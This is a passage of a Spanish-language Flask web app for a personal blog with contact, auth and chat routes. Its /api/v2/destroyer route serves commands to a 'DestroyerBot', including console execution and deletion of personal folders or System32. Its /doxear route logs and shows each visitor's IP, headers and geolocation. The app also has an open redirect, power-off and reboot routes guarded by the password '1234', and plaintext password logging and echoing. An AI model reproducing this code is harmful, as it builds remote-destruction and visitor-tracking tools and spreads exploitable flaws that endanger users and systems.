        elif request.args.get('autor'):
            autor = USERPG.GET_USER('username', request.args.get('autor'))
            posts = BLOGPG.GET_BL('creat_id', autor['username'])
        elif request.args.get('time'):
            posts = BLOGPG.GET_BL('time', request.args.get('time'))
        elif request.args.get('search'):
            allposts = BLOGPG.GET_BL('all')
            data_search = request.args.get('search').lower()
            posts = []
            for post in allposts:
                if data_search in post['title'].lower() or data_search in post['content'].lower() or data_search in post['descript'].lower():
                    posts.append(post)
        else:
            posts = BLOGPG.GET_BL('all')

        page = request.args.get('page', 1, type=int)
        per_page = 9
        if posts == None:
            posts = []
        total_posts = len(posts)
        total_pages = (total_posts + per_page - 1) // per_page  # Calcula el número total de páginas
        start = (page - 1) * per_page
        end = start + per_page
        paginated_posts = posts[start:end]
        paginated_posts.sort(key=lambda x: x['id'], reverse=True)
        if sessions == True:
            return render_template("blog/blog.html", posts=paginated_posts, page=page, total_pages=total_pages, user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template("blog/blog.html", posts=paginated_posts, page=page, total_pages=total_pages, cookie=dark_mode, version=VERSION)       
    except Exception as e:
        log.error(
            f"[{ip_client}] [/layout ] ERROR[-1]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/blog/<name>", methods=["POST", "GET"])
def blogview(name):
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:      
        log.info(f"Name: {name}")
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            sessions = True
        except:
            uss = None
            sessions = False     
        posts = BLOGPG.GET_BL('all')
        posts.sort(key=lambda x: x['id'], reverse=True)
        recent = posts[:3]
        the_posts = BLOGPG.GET_BL("title", name, SUM_VIEW=True)
        if the_posts == None:
            return redirect(url_for("blog"))
        for edit_post in the_posts:
            BLOGPG.EDIT_BL('count_view', edit_post['id'], edit_post['count_view'])
        if sessions == True:
            return render_template("blog/blogview.html",the_post=the_posts, recent=recent, uid=uid, user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template("blog/blogview.html",the_post=the_posts, recent=recent, cookie=dark_mode, version=VERSION)    
    except Exception as e:
        log.error(
            f"[{ip_client}] [/blogview ] ERROR[-1]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/blogpost", methods=["POST", "GET"])
def blogpost():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            sessions = True
        except:
            uss = None
            sessions = False
        if sessions == True:
            if request.method == "POST":
                CREAT_ID = uid
                TITLE = request.form.get("title")
                DESCRIP = request.form.get("descrip")
                CONTENT = request.form.get("content")
                IMAGE = request.form.get("image")
                TAGS = request.form.get("tags").replace(" ", "")
                
                BLOGPG.INSERT_BL(TITLE, DESCRIP, CONTENT, CREAT_ID, IMAGE, TAGS)
                return redirect(url_for("blog"))
            else:
                return render_template("blog/blogpost.html", user=uss, cookie=dark_mode, version=VERSION)
        else:
            return redirect(url_for("login"))
    except Exception as e:
        log.error(f"[{ip_client}] [/layout ] ERROR[-1]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))
 

@app.route("/blogedit/<post_id>", methods=["POST", "GET"])
def blogedit(post_id):
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            sessions = True
        except:
            uss = None
            sessions = False
        if sessions == True:
            if BLOGPG.GET_BL('id', post_id):
                post = BLOGPG.GET_BL('id', post_id, MARKDOWN=False, UID=False, TAGS=False)[0]
            else:
                flash("No tienes permiso para editar este post", "danger")
                log.warning(f"[{ip_client}] [/layout ] Usuario [{uss}] no autorizado")
                return redirect(url_for("blog"))     
            if request.method == "POST":
                
                    if post['creat_id'] == int(uid):
                        TITLE = request.form.get("title")
                        DESCRIP = request.form.get("descrip")
                        CONTENT = request.form.get("content")
                        IMAGE = request.form.get("image")
                        TAGS = request.form.get("tags").replace(" ", "")
                        try:
                            BLOGPG.EDIT_BL("title", post_id, TITLE)
                            BLOGPG.EDIT_BL("descript", post_id, DESCRIP)
                            BLOGPG.EDIT_BL("content", post_id, CONTENT)
                            BLOGPG.EDIT_BL("image", post_id, IMAGE)
                            BLOGPG.EDIT_BL("tags", post_id, TAGS)
                            flash("Post editado correctamente", "success")
                            return redirect(url_for("blog"))
                        except Exception as e:
                            flash("Error al editar el post", "danger")
                            log.error(f"[{ip_client}] [/blogedit ] ERROR[-1]: {e} [{traceback.format_exc()}]")
                            return redirect(url_for("blog"))
            else:
                return render_template("blog/blogedit.html", post=post, postid=post_id, user=uss, cookie=dark_mode, version=VERSION)
        else:
            flash("No tienes permiso para editar este post", "danger")
            log.warning(f"[{ip_client}] [/layout ] Usuario no autorizado")
            return redirect(url_for("login"))
    except Exception as e:
        log.error(f"[{ip_client}] [/layout ] ERROR[-1]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))
    
    
@app.route("/blogdelete/<post_id>")
def blogdelete(post_id):
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            sessions = True
        except:
            uss = None
            sessions = False
        if sessions == True:
            if BLOGPG.GET_BL('id', post_id):
                post = BLOGPG.GET_BL('id', post_id, UID=False)[0]
                if post['creat_id'] == int(uid):
                    BLOGPG.DELETE_BL(post_id)
                    flash("Post borrado correctamente", "success")
                    return redirect(url_for("blog"))
                else:
                    flash("No tienes permiso para borrar este post", "danger")
                    return redirect(url_for("blog"))
            else:
                flash("El post no existe", "danger")
                return redirect(url_for("blog"))
        else:
            return Response(status=403)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/details ] ERROR[0013]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/redirect")
def w_redirect():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        if request.args.get('url'):
            return redirect(request.args.get('url'))
        if  request.args.get('r'):
            return redirect(request.args.get('r'))
        else:
            return redirect(url_for("index"))
    except Exception as e:
        log.error(
            f"[{ip_client}] [/details ] ERROR[0013]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/details")
def detalles():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if sessions == True:
            return render_template('details.html', user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template('details.html', cookie=dark_mode, version=VERSION)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/details ] ERROR[0013]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))
   

@app.route("/services")
def servicios():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if sessions == True:
            return render_template("services.html", user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template("services.html", cookie=dark_mode, version=VERSION)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/services ] ERROR[0014]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))
        


@app.route("/contact", methods=["POST", "GET"])
def contactar():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        try:
            try:
                uid = session["user"]
                suid = USERPG.GET_USER("id", uid)
                uss = suid['username']
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            
            nowtime = datetime.datetime.now()
            email_user = request.form.get("email")
            username = request.form.get("username")
            message_user = request.form.get("message")
            email_to_send = EMAIL_WEBMASTER

            subject = f"MSGWeb de {str(username)}"
            message = f"""<html>
                <head></head>
                <body>
                <div class="container">
                <h1>Enviado por: <strong>{str(username)}</strong></h1>
                <h2>El dia {nowtime.strftime('%m/%d/%Y - %I:%M%p')}.</h2>
                </div>
                <div class="container">
                <h1>Email del usuario:</h1>
                <h1><strong>{email_user}</strong></h1>
                </div>
                <h1>Mensaje del usuario</h1><h2>{message_user}</h2>
                </body>
                </html>"""

            SEND_MAIL(email_to_send, subject, message)
            resp = "Mensaje enviado, espere nuestra respuesta en su correo"

            if sessions == True:
                return render_template("contact.html", user=uss, response=resp, cookie=dark_mode, version=VERSION)
            else:
                return render_template("contact.html", response=resp, cookie=dark_mode, version=VERSION)
        except Exception as e:
            log.error(
                f"[{ip_client}] [/contact ] ERROR[0016]: {e} [{traceback.format_exc()}]")
            return redirect(url_for("index"))
    else:
        try:
            try:
                uid = session["user"]
                suid = USERPG.GET_USER("id", uid)
                uss = suid['username']
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                return render_template("contact.html", user=uss, cookie=dark_mode, version=VERSION)
            else:
                return render_template("contact.html", cookie=dark_mode, version=VERSION)
        except Exception as e:
            log.error(
                f"[{ip_client}] [/contact ] ERROR[0017]: {e} [{traceback.format_exc()}]")
            return redirect(url_for("index"))


@app.route("/conditions")
def ter_y_co():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if sessions == True:
            return render_template("privacy.html", user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template("privacy.html", cookie=dark_mode, version=VERSION)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/conditions ] ERROR[0018]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/privacy")
def privacy():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if sessions == True:
            return render_template("privacy.html", user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template("privacy.html", cookie=dark_mode, version=VERSION)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/privacy ] ERROR[0019]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/favicon.ico")
def favicon():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_path = os.path.join(CONFIG.SYSTEM_PATH, "static")
        return send_from_directory(the_path, "favicon.png", as_attachment=False)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/icon ] ERROR[0020]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/robots.txt")
def robots_txt():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_path = os.path.join(CONFIG.SYSTEM_PATH,"static","extra")
        log.debug(f"[{ip_client}] [/robots.txt ] [OK]")
        return send_from_directory(the_path, "robots.txt", as_attachment=False)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/robots.txt ] ERROR[0021]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))

    

@app.route("/humans.txt")
def humans_txt():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_path = os.path.join(CONFIG.SYSTEM_PATH,"static","extra")
        log.debug(f"[{ip_client}] [/humans.txt ] [OK]")
        return send_from_directory(the_path, "humans.txt", as_attachment=False)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/humans.txt ] ERROR[0022]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))



@app.route("/sitemap.xml")
def sitemap_xml():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_path = os.path.join(CONFIG.SYSTEM_PATH,"static","extra")
        log.debug(f"[{ip_client}] [/sitemap.xml ] [OK]")
        return send_from_directory(the_path, "sitemap.xml", as_attachment=False)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/sitemap.xml ] ERROR[0023]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/v2/sitemap.xml")
def sitemap2_xml():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_path = os.path.join(CONFIG.SYSTEM_PATH,"static","extra")
        log.debug(f"[{ip_client}] [/sitemap.xml ] [OK]")
        return send_from_directory(the_path, "sitemap.xml", as_attachment=True)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/sitemap.xml ] ERROR[0023]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))


@app.route("/healthcheck")
def healthcheck():
    return "ok"
    


@app.route("/status")
def status_server():
    ip_client = request.headers.get("X-Real-IP")
    try:
        actual_time = time.time()
        total_time = actual_time - START_SERVER_TIME
        total_time_hour = int(total_time // 3600)
        total_time_min = int((total_time % 3600) // 60)
        total_time_sec = int(total_time % 60)
        
        html=f"""
        <html>
        <head> <title>Server Status</title></head>
        <body>
        <h1>Server Status</h1>
        </body>
        <p><strong>Server Time:</strong> {total_time_hour} hours {total_time_min} min {total_time_sec} sec active :)</p>
        </html>
        """ 
        log.debug(f"[{ip_client}] [/Status ] [OK]")
        return html
    except Exception as e:
        log.error(
            f"[{ip_client}] [/Status ] ERROR[0024]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))
    

@app.route("/admin/logger")
def getlogger():
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if sessions == True:
            # implementar revicion if
            log.info(f"[{ip_client}] [/logger ] [{uss} a revisado los logs]")
            the_path = os.path.join(CONFIG.SYSTEM_PATH,"logs")
            return send_from_directory(the_path, "logger.log", as_attachment=False)      
        else:
            return redirect(url_for("index"))
            
    except Exception as e:
        log.error(
            f"[{ip_client}] [/layout ] ERROR[-0]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))







@app.route("/tchat")
def testchat():
    return render_template("chat/chat1.html")


@app.route("/tchat2")
def testchat2():
    return render_template("chat/chat2.html")


@app.route("/tchat3")
def testchat3():
    return render_template("chat/chat3.html")


@app.route("/layout")
def layout():
    dark_mode = request.cookies.get('dark-mode', 'true')
    ip_client = request.headers.get("X-Real-IP")
    try:
        try:
            uid = session["user"]
            suid = USERPG.GET_USER("id", uid)
            uss = suid['username']
            token = session["token"]
            sessions = True
        except:
            uss = None
            token = None
            sessions = False
        if sessions == True:
            return render_template("layout.html", user=uss, cookie=dark_mode, version=VERSION)
        else:
            return render_template("layout.html", cookie=dark_mode, version=VERSION)
    except Exception as e:
        log.error(
            f"[{ip_client}] [/layout ] ERROR[-1]: {e} [{traceback.format_exc()}]")
        return redirect(url_for("index"))



@app.route("/poweroff", methods=["POST", "GET"])
def poweroff():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        passw = request.form.get("pass")
        if passw == "1234":
            log.warning(f"[{ip_client}] [/poweroff ] [method POST] apagando")
            os.kill(os.getpid(), signal.SIGINT)
            return "apagando XD"
        else:
            log.warning(f"[{ip_client}] [/poweroff ] [method POST] nop XD")
            return "nop XD"
    else:
        form = "<form action='/poweroff' method='POST'>\
        <input id='pass' type='password' name='pass'>\
        <input type='submit' name='send'></form>"
        return form

@app.route("/reboot", methods=["POST", "GET"])
def reboot():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        passw = request.form.get("pass")
        if passw == "1234":
            log.warning(f"[{ip_client}] [/reboot ] [method POST] reiniciando")
            os.execv(sys.executable, ["python"] + sys.argv)
            return "reiniciando XD"
        else:
            log.warning(f"[{ip_client}] [/reboot ] [method POST] nop XD")
            return "nop XD"
    else:
        form = "<form action='/reboot' method='POST'>\
        <input id='pass' type='password' name='pass'>\
        <input type='submit' name='send'></form>"
        return form


@app.route("/setcookie", methods=["POST", "GET"])
def setcookie():
    resp = make_response()
    resp.set_cookie("userID", "XD")
    return resp

@app.route("/getcookie", methods=["POST", "GET"])
def getcookie():
    name = request.cookies.get("userID")
    return name

@app.route("/d")
@app.route("/doxear", methods=["POST", "GET"])
def doxear():
    client_ip = request.headers.get("X-Real-IP")
    headers = request.headers
    localis = requests.get(f"http://ip-api.com/json/{client_ip}")
    localis = localis.json()
    log.critical(
        f"[/doxear ] [method GET] [ip] {client_ip} [headesrs] {headers} [localis] {localis} ")

    return f"<h1>Hola {client_ip} </h1> <h2> Headers: {headers} </h2> <h3> Localis: {localis} </h3>"


@app.errorhandler(404)
def not_found(error=None):
  error_page = render_template('errors/404.html')
  return Response(error_page, status = 404)


@app.errorhandler(500)
def not_found(error=None):
  error_page = render_template('errors/500.html')
  return Response(error_page, status = 500)








@app.route("/dev", methods=["POST", "GET"])
def dev():
    return render_template("_dev/extra/index.html")


@app.route("/dev2", methods=["POST", "GET"])
def dev2():
    return render_template("_dev/extra/blog.html")


@app.route("/dev3", methods=["POST", "GET"])
def dev3():
    return render_template("_dev/extra/blog-single.html")


@app.route("/dev4", methods=["POST", "GET"])
def dev4():
    return render_template("_dev/auth/terms-conditions.html")

@app.route("/dev5", methods=["POST", "GET"])
def dev5():
    return render_template("_dev/auth/privacy-policy.html")

    


################### API/v1 #######################

datosmsg = []
datosmsg_all = []

@app.route("/api/auth", methods=["POST", "GET"])
def apiauth_v1():
    try:
        auth = request.get_json()
        auth_user = auth["username"]
        auth_email = auth["EMAIL"]
        auth_passw = auth["PASSW"]
        print(auth_user, auth_email, auth_passw)

        key = app.config.get("SECRET_KEY")
        E_EMAIL = USERPG.ENCRIPT(auth_email, key)
        E_PASSW = USERPG.ENCRIPT(auth_passw, key)
        if USERPG.VALIDAR(auth_user, auth_passw, key) == True:
            datos_send_token = {
                "exp": datetime.datetime.utcnow()
                + datetime.timedelta(days=0, minutes=13, seconds=0),
                "iat": datetime.datetime.utcnow(),
                "USER": auth_user,
                "EMAIL": E_EMAIL,
                "PASSW": E_PASSW,
            }

            eltoken = jwt.encode(
                datos_send_token, app.config.get("SECRET_KEY"), algorithm="HS256"
            )

            allb = {"@all": f"bot:@{auth_user} se a unido"}
            datosmsg_all.append(allb)
            userb = {f"@{auth_user}": "bot:bienvenido al chat"}
            datosmsg.append(userb)

            return jsonify({"TOKEN": f"{eltoken}"})
        else:
            status = 401
            return jsonify({"ERROR": "DATOS DE AUTENTIFICACION INCORRECTOS"}), status
    except:
        status = 400
        return jsonify({"ERROR": "BAD REQUEST"}), status


@app.route("/api/msg", methods=["POST", "GET"])
def apimsg():
    if request.method == "POST":
        try:
            try:
                token = request.get_json()
                auth_token = token["TOKEN"]
                datos = token["DATOS"]

            except:
                auth_token = ""
                datos = ""

            verificador = jwt.decode(
                auth_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
            )
            print("TOKEN:", verificador["USER"], "\nMSG:", datos)
            try:
                if datos["@all"]:
                    datosmsg_all.append(datos)
            except:
                datosmsg.append(datos)
            print(datosmsg)
            return jsonify({"VALIDO": f"DATOS RESIVIDOS CORRECTAMENTE :) "})
        except jwt.ExpiredSignatureError:
            print("expiro")
            status = 403
            return jsonify({"ERROR": "EL TOKEN EXPIRO"}), status
        except jwt.InvalidTokenError:
            print("Invalid token. Please log in again.")
            status = 401
            return jsonify({"ERROR": "TOKEN INVALIDO"}), status

    else:
        larespuesta = datosmsg_all, datosmsg
        return jsonify({"VALIDO": larespuesta})

#################### API/v2 ######################
# Auth v2

@app.route("/api/v2/auth", methods=["POST", "GET"])
def apiauth_v2():
    try:
        pass
    except:
        pass


@app.route("/api/v2/destroyer", methods=["POST", "GET"])
def destroyer_bot():
    ip_client = request.headers.get("X-Real-IP")
    try:
        if request.method == "POST":
            user_agent = request.headers.get("User-Agent")
            if user_agent == "DestroyerBot":
                try:
                    data = request.get_json()
                    if data["Response"] == True:
                        # Registrar el mensaje enviado por el bot
                        log.warning(
                            f"[/api/v2/destroyer ] [method POST] Mensaje recibido desde {ip_client}: {data['Response_Text']}")
                except:
                    data = None

                response_data = {
                    "DestroyerCall": False,
                    "kill_Personal_Carpet": False,
                    "Kill_Spesific_Folder": False,
                    "Folders_Route": ["C:\\Windows\\System32"],
                    "Delete_Bot": False,
                    "Stop_Bot": False,
                    "Execute_Console": True,
                    "Console_command": ["ping google.com -c3"]
                }
                log.info(
                    f"[/api/v2/destroyer ] [method POST] DestroyerBot {ip_client} con User-Agent {user_agent}, {data}")
                return jsonify(response_data)
            else:
                user_agent = request.headers.get("User-Agent")
                log.warning(
                    f"[/api/v2/destroyer ] [method POST] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
                return jsonify({"error": "Forbidden"}), 403
        else:
            ip_client = request.headers.get("X-Real-IP")
            log.warning(
                f"[/api/v2/destroyer ] [method GET] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
            headers = request.headers
            return f"{headers}"

    except Exception as e:
        log.error(
            f"[/api/v2/destroyer ] Error al procesar la petición: {e} [{traceback.format_exc()}]")
        return jsonify({"error": "Internal server error"}), 500

################## Test Auth #####################

# Definir los usuarios
users = {
    'juan': '1234'
}

# Definir la ruta de auth
@app.route('/auth')
def auth_form():
    if request.args.get('username') is None:
        return render_template("auth/log-in_layout.html")
    username = request.args.get('username')
    return render_template("auth/AuthApi.html", username=username)

# Definir la ruta de autorización
@app.route('/auth/authorize', methods=["POST", "GET"])
def authorize():
    # Obtener el nombre de usuario y la contraseña del usuario
    if request.method == "POST":
        username = request.form.get('username')
        password = request.form.get('password')
        key = app.config.get("SECRET_KEY")
        log.info(f"[auth ] [method POST] {username} {password}")

        # Verificar las credenciales del usuario
        if username.__contains__('"'):
                    ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER COMILLAS"
                    return render_template("auth/log-in_layout.html", ERROR2=ERROR)
        if USERPG.VALIDAR(username, password, key) == True:
            if username.__contains__("@"):
                TheUser = USERPG.GET_USER("email", username)
            else:
                TheUser = USERPG.GET_USER("username", username)
            # Generar un código de autorización
            code = '123456'

            # Redirigir al usuario a la aplicación
            return render_template("auth/Authresponse.html", code=code)
        else:
            # Devolver un error
            return f'Error de autorización,{username,password} '
    return render_template("auth/log-in_layout.html")

# Definir la ruta de devolución de llamada
@app.route('/auth/callback')
def callback():
    # Obtener el código de autorización del usuario
    code = request.args.get('code')

    # Generar un token de acceso
    token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoidGhhdCJ9.Kl1fX8W7-0_6q_XDXO2QKL-6_j-3Z-4_p6-_0yh0E-8'

    # Devolver el token de acceso
    return token


#################### SoketIO #####################
# Para que funcione bien, debes instalar el paquete Flask-SocketIO
socketio = SocketIO(app, cors_allowed_origins="*")


@socketio.on("connect")
def test_connect():
    print("Cliente conectado")
    log.debug("Cliente conectado")
    # Aquí puedes hacer lo que quieras con la conexión
    # Ejemplo: enviar un mensaje al cliente que se conecté
    #
    emit("after connect", {"data": "Lets dance"})


@socketio.on("opcion")
def handle_opcion(opcion):
    print("Recibida opción: " + opcion)
    log.debug("Recibida opción: " + opcion)
    # Aquí puedes hacer lo que quieras con la opción recibida
    emit("mensaje", "Has seleccionado la opción " + opcion)


@socketio.on("boton")
def handle_boton(estado):
    print("Recibido estado del botón: " + estado)
    log.debug("Recibido estado del botón: " + estado)
    # Aquí puedes hacer lo que quieras con el estado del botón
    emit("mensaje", "El botón está " + estado)


# Cambia la lógica del manejador para el evento 'boton normal'
@socketio.on("boton normal")
def handle_boton_normal(estado):
    print("Recibido estado del botón normal: " + estado)
    log.debug("Recibido estado del botón normal: " + estado)
    # Envía el mensaje según el estado recibido
    emit("mensaje", "Se ha clicado el botón normal y ahora está " + estado)


# Añade una función decorada con @socketio.on('texto')
@socketio.on("texto")
def handle_texto(texto):
    print("Recibido texto: " + texto)
    log.debug("Recibido texto: " + texto)
    # Añade una estructura condicional para enviar una respuesta diferente según el texto
    if texto == "hola":
        emit("respuesta", "Hola, ¿qué tal?")

    elif texto == "/start":
        emit("respuesta", "Hola, XD")

    elif texto == "/quit":
        emit("respuesta", "Adiós, hasta pronto")

    elif texto == "XD":
        emit("respuesta", "Jaja, muy gracioso")

    elif texto == "/help":
        emit("respuesta", "Escribe hola o XD")

    else:
        emit("respuesta", "No entiendo lo que dices")


@app.route("/test")
def config():
    return render_template("app/socket.html")


values = {
    "slider1": 25,
    "slider2": 0,
}


@socketio.on("Slider value changed")
def handle_slider_change(message):
    # receive the slider value change from the client
    print("received slider value change: " + str(message))
    # update the values dictionary with the new value
    values[message["who"]] = message["data"]
    # emit the updated value to all the connected clients
    emit("update value", message, broadcast=True)


@app.route("/test1")
def slider():
    return render_template(
        "app/test.html", slider1=values["slider1"], slider2=values["slider2"]
    )


@socketio.on("message")
def Text_MSG(msg):
    print("text-message: " + msg)
    send(msg, broadcast=True)


@app.route("/test2")
def chat():
    return render_template("app/chat.html", **values)


if __name__ == "__main__":
    # run app in debug mode on port 5000' ssl_context=(cert_ssl, priv_ssl),
    # cert_ssl = 'CERT/fullchain.pem' priv_ssl = 'CERT/privkey.pem'

    DEBUG = True if os.getenv("DEBUG") == "True" else False
    app.run(threaded=True, host="0.0.0.0", port=9001, debug=DEBUG)
